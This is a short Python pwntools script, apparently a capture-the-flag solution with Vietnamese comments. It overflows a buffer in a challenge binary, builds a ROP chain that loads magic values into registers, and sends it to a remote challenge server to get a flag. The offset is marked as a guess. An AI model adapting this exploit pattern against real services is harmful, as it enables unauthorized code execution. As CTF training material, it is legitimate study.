from pwn import *

# Cấu hình môi trường
context.binary = elf = ELF('./rickrolled') # Thay './rickrolled' bằng tên file binary
# p = process() # Chạy chương trình cục bộ
p = remote('43.205.113.100', 8056) # Kết nối đến server, thay hostname và port

# Tìm gadget
rop = ROP(elf)
pop_r11_r12_r13_r14_r15_ret = rop.find_gadget(['pop r11', 'pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'])[0]

# Các giá trị mục tiêu
r11_val = 0xbeefdead
r13_val = 0xabadbeef
r15_val = 0xdeadbead

# Offset từ buffer đến return address
# Cần xác định offset này bằng debugger (gdb)
offset = 40 # Đây là một giá trị giả định

# Xây dựng payload
payload = flat(
    b'A' * offset, # Điền vào buffer + padding
    pop_r11_r12_r13_r14_r15_ret,
    r11_val,
    0x0, # Giá trị giả cho r12
    r13_val,
    0x0, # Giá trị giả cho r14
    r15_val,
    elf.symbols['rickroll'] + 5 # Quay lại đoạn kiểm tra điều kiện trong hàm rickroll
)

# Gửi payload
p.sendlineafter(b'Do you have anything to say to me?\n', payload)

# Nhận flag
p.interactive()